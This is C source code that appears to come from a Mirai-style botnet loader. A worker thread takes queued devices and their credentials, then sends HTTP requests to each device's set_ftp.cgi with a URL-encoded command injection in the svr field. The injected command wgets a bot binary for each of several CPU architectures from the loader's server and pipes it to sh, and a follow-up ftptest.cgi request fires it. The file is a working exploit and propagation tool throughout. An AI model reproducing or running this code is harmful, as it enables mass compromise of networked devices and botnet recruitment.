#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/config.h"
#include "headers/binary.h"

static const char *arch_try_order[] = { "arm7", "arm", "mips", "mpsl", "x86", NULL };

static void *goahead_worker(void *arg)
{
	struct server *srv = (struct server *)arg;
	struct telnet_info info;
	char req[1024];
	char rbuf[512];
	int fd, n, i;

	while (1)
	{
		if (pthread_mutex_lock(&srv->goahead_lock) != 0)
			break;
		if (srv->goahead_queue_len == 0)
		{
			pthread_mutex_unlock(&srv->goahead_lock);
			usleep(100000);
			continue;
		}
		memcpy(&info, &srv->goahead_queue[0], sizeof(info));
		memmove(&srv->goahead_queue[0], &srv->goahead_queue[1], (srv->goahead_queue_len - 1) * sizeof(struct telnet_info));
		srv->goahead_queue_len--;
		pthread_mutex_unlock(&srv->goahead_lock);

		fd = socket(AF_INET, SOCK_STREAM, 0);
		if (fd < 0)
			continue;

		struct sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = info.addr;
		addr.sin_port = info.port;

		struct timeval tv = { 10, 0 };
		setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
		setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

		if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		{
			close(fd);
			continue;
		}

		for (i = 0; arch_try_order[i] != NULL; i++)
		{
			const char *arch = arch_try_order[i];
			snprintf(req, sizeof(req),
				"GET /set_ftp.cgi?loginuse=%s&loginpas=%s&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%%24%%28wget%%20http%%3A%%2F%%2F%s%%3A%d%%2Fbins%%2F%s.%s%%20-O%%20-%%20%%7C%%20sh%%29 HTTP/1.0\r\nHost: x\r\n\r\n",
				info.user, info.pass, HTTP_SERVER, HTTP_PORT, FN_BINARY, arch);
			send(fd, req, strlen(req), MSG_NOSIGNAL);
			recv(fd, rbuf, sizeof(rbuf) - 1, 0);
			snprintf(req, sizeof(req), "GET /ftptest.cgi?loginuse=%s&loginpas=%s HTTP/1.0\r\nHost: x\r\n\r\n", info.user, info.pass);
			send(fd, req, strlen(req), MSG_NOSIGNAL);
			n = recv(fd, rbuf, sizeof(rbuf) - 1, 0);
		}

		ATOMIC_INC(&srv->total_goaheads);
		close(fd);
	}
	return NULL;
}

void server_goahead_start(struct server *srv)
{
	pthread_mutex_init(&srv->goahead_lock, NULL);
	srv->goahead_queue = calloc(1024, sizeof(struct telnet_info));
	srv->goahead_queue_cap = 1024;
	srv->goahead_queue_len = 0;
	pthread_create(&srv->goahead_thrd, NULL, goahead_worker, srv);
}

void server_queue_goahead(struct server *srv, struct telnet_info *info)
{
	pthread_mutex_lock(&srv->goahead_lock);
	if (srv->goahead_queue_len < srv->goahead_queue_cap)
	{
		memcpy(&srv->goahead_queue[srv->goahead_queue_len++], info, sizeof(struct telnet_info));
	}
	pthread_mutex_unlock(&srv->goahead_lock);
}
